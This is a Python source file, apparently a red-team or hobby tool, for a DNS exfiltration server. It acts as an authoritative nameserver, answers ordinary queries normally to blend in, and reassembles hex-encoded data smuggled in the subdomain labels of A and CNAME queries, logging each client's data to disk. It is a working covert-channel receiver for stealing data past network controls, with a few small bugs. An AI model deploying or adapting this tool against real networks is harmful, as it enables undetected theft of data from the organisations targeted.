from enum import Enum
import os
from random import choice
import socket
import time
import dnslib as dns
import argparse

class PacketTypes(Enum):
    START = 1  # A Record
    DATA = 5  # CNAME Record

# thrown when packets should skip processing
class ShortCircuitException(Exception):
    pass

# should be thrown when we determine requests are unrelated to the logger
class UnrelatedException(Exception):
    pass

class NSQueryException(Exception):
    pass

class DNSSyntaxException(Exception):
    pass

class ServerMaxConnectionsException(Exception):
    pass

class NXConnectionException(Exception):
    pass

class PacketsOutOfOrderException(Exception):
    pass

# A means of concatonating data and displaying it.
class DataParser():
    def __init__(self, ip):
        self.last_received = -1
        self.data = bytearray()
        self.ip = ip

    # get number of pushes
    def get_length(self):
        return len(self.data)
    
    # add data
    # raises PacketsOutOfOrderException if packet received is in wrong order
    def add(self, packet_number: int, data: bytes):
        if not (packet_number > self.last_received or packet_number == 0):
            self.last_received = 0
            raise PacketsOutOfOrderException()
        try:
            data.decode('ascii')
            self.data.extend(data)
        except:
            print("Unable decode last data packet: " + str(data))
        finally:
            self.last_received = packet_number
            print(self.parse_all())

    # parse the last received bytes
    def parse_last(self):
        return self.data[-1].decode('ascii')
    
    def parse_all(self):
        return self.data.decode('ascii')
    
    def save_to_disk(self, path: str, id: int):
        file = open(f'{path}/{id}-{self.ip}-{int(time.time())}.log', 'x', encoding='ascii')
        file.write(self.data.decode('ascii'))

# Manage all of the data parsers, feed it the raw data that comes before the sld.
# Raises a DNSSyntaxException if the data is not correctly formatted.
# Raises a NXConnectionException if the data is properly formatted, but the connection doesn't exist.
class DataParserManager():
    def __init__(self):
        self.parsers = []  # DataParser array

    def add_parser(self, parser: DataParser):
        self.parsers.append(parser)

    def parse(self, data: str):
        if data.count('.') != 2:
            raise DNSSyntaxException()
        
        connection_id = int(data[data.index('.') + 1:data.rindex('.')])
        if connection_id > len(self.parsers):
            raise NXConnectionException()
        
        hex = data[data.rindex('.') + 1:]
        if len(hex) % 2 == 1:
            raise DNSSyntaxException()
        packet_number = int(data[:data.index('.')])
        parser: DataParser = self.parsers[connection_id - 1]
        parser.add(packet_number, bytes.fromhex(hex))
        return (packet_number, connection_id - 1)

    def number_of_connections(self):
        return len(self.parsers)
    
    def save_parsers(self, save_path: str):
        os.makedirs(save_path, exist_ok=True)
        for i in range(len(self.parsers)):
            parser: DataParser = self.parsers[i]
            parser.save_to_disk(save_path, i + 1)


def blank_response(requets: dns.DNSRecord):
    answer = request.reply()
    answer.header.rcode = dns.RCODE.NOERROR
    return answer

def nx_response(request: dns.DNSRecord):
    answer = request.reply()
    answer.header.rcode = dns.RCODE.NXDOMAIN
    return answer

# send reconnect request
def reconn_response(request: dns.DNSRecord):
    answer = request.reply()
    answer.header.rcode = dns.RCODE.REFUSED
    return answer

# send request to reset packet number
def reset_response(request: dns.DNSRecord):
    answer = request.reply()
    answer.header.rcode = dns.RCODE.NOTIMP
    return answer

def create_fake_ip(connections: int):  # generates a fake ip address that isn't reserved.
    if connections > 254:
        raise ServerMaxConnectionsException()
    fake = ""
    fake += str(choice([i for i in range(1, 254) if i not in [0, 10, 100, 127, 169, 172, 192, 198, 203, 224, 233, 250, 255]]))
    for i in range(2):
        fake += "." + str(choice(range(256)))
    fake += "." + str(connections + 1)
    return fake

def index_of_2nd(string: str, sub: str):
    index = 0
    last = 0
    for i in range(len(string)):
        if string[i] == sub:
            index = last
            last = i
    return index

def get_domain_from_full(full: str):
    stripped = full.rstrip('.')  # remove trailing dot if exists
    index = index_of_2nd(stripped, '.')
    return full[index + int(index != 0):]

# throws unrelated exception if the data is unrelated to the logger
def get_data(full: str, domain: str):
    stripped = full.rstrip('.')  # remove trailing dot
    if not (stripped.endswith(domain) or stripped.endswith("." + domain)):
        ## TODO: make it so things like eexample.com are not allowed
        raise ShortCircuitException()
    if stripped.count('.') != 4:
        raise UnrelatedException()
    return full[:index_of_2nd(stripped, '.')]

parser = argparse.ArgumentParser("dns exfiltration server")
parser.add_argument('-p', '--port', help='port to listen on', type=int, default=53)
parser.add_argument('ip', type=str)
parser.add_argument('domain', type=str)
args = parser.parse_args()

PORT = args.port
IP = args.ip
DOMAIN = args.domain
SAVE_PATH = "./logs"
data_parsers = DataParserManager()

# DNS Related
NS_RECORDS = [dns.NS("ns1." + DOMAIN), dns.NS("ns2." + DOMAIN)]
ADMIN_EMAIL = "email." + DOMAIN
SOA_RECORD = dns.SOA(
    mname=str(NS_RECORDS[0]),
    rname=ADMIN_EMAIL,
    times=(
        20240001, # serial
        7200, # refresh
        3600, # retry
        12096000, # expire
        3600, # minimum
    )
)
DEFAULT_RECORDS = {
    DOMAIN: [dns.A(IP), SOA_RECORD] + NS_RECORDS,
    "ns1."+DOMAIN: [dns.A(IP)],
    "ns2."+DOMAIN: [dns.A(IP)],
    "email."+DOMAIN: [dns.CNAME(DOMAIN)],
}

udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# listen on UDP port
udp_socket.bind(('0.0.0.0', PORT))

print("Listening for traffic...")

try:
    while True:
        # wait for an incoming packet
        data, addr = udp_socket.recvfrom(1024)  # 1024 so packets don't get dropped, but max size shouldn't be above 255
        # print("Received packet from " + addr[0] + "#" + str(addr[1]))
        try:
            request = dns.DNSRecord.parse(data)
        except Exception as e:
            print("Could not parse.")
            continue  # skip the rest of this loop
        # make generic response structure
        response = dns.DNSRecord(dns.DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        
        try:
            data = get_data(str(request.q.qname), DOMAIN)
            if request.q.qtype == PacketTypes.START.value:
                print(f"Starting connection: {data_parsers.number_of_connections()}")
                # form response
                # reply with fake IP address, but last octet is current # of connections, starting at 1
                response = dns.DNSRecord(dns.DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                response.add_answer(dns.RR(rname=str(request.q.qname), rtype=dns.QTYPE.A, rdata=dns.A(create_fake_ip(data_parsers.number_of_connections()))))
                data_parsers.add_parser(DataParser(addr[0]))
            elif request.q.qtype == PacketTypes.DATA.value:
                metadata = data_parsers.parse(data)
                print(f"Parsing data from {metadata[1]}")

                # form response
                response.header.rcode = dns.RCODE.NOERROR
                domain = get_domain_from_full(str(request.q.qname))
                response.add_answer(dns.RR(rname=str(request.q.qname), rtype=dns.QTYPE.CNAME, rdata=dns.CNAME(domain)))
        except ShortCircuitException as e:
            # do nothing and allow the blank response to be sent
            print("Short circuit: sending nothing.")
        except UnrelatedException as e:
            print("Treating request as normal DNS query")
            # process like normal DNS server
            for name, rrs in DEFAULT_RECORDS.items():
                if name == str(request.q.qname):
                    for rdata in rrs:
                        rqt = rdata.__class__.__name__
                        if request.q.qtype in ['*', rqt]:
                            response.add_answer(dns.RR(rname=str(request.q.qname), rtype=request.q.qtype, rclass=1, ttl=3600, rdata=rdata))
        except DNSSyntaxException as e:
            print("Improper syntax for DNS packet from " + addr[0] + "#" + str(addr[1]))
            response = nx_response(request)
        except ServerMaxConnectionsException as e:
            print("Server has reached maximum number of concurrent connections from " + addr[0] + "#" + str(addr[1]))
            response = nx_response(request)
        except NXConnectionException as e:
            print("Connection does not exist from " + addr[0] + "#" + str(addr[1]))
            response = reconn_response(request)
        except PacketsOutOfOrderException as e:
            print("Receiving out of order packets from " + addr[0] + "#" + str(addr[1]))
            response = reset_response(request)
        except Exception as e:
            print("Exception raised: " + str(e) + "\n from " + addr[0] + "#" + str(addr[1]))
        finally:
            # send response
            for rdata in NS_RECORDS:
                response.add_ar(dns.RR(rname=DOMAIN, rtype=dns.QTYPE.NS, rclass=1, ttl=3600, rdata=rdata))
            response.add_ar(dns.RR(rname=DOMAIN, rtype=dns.QTYPE.SOA, rclass=1, ttl=3600, rdata=SOA_RECORD))
            udp_socket.sendto(response.pack(), addr)
except KeyboardInterrupt:
    print()
finally:
    print("Shutting down server...")
    udp_socket.close()
    data_parsers.save_parsers(SAVE_PATH)
    print("Goodbye.")
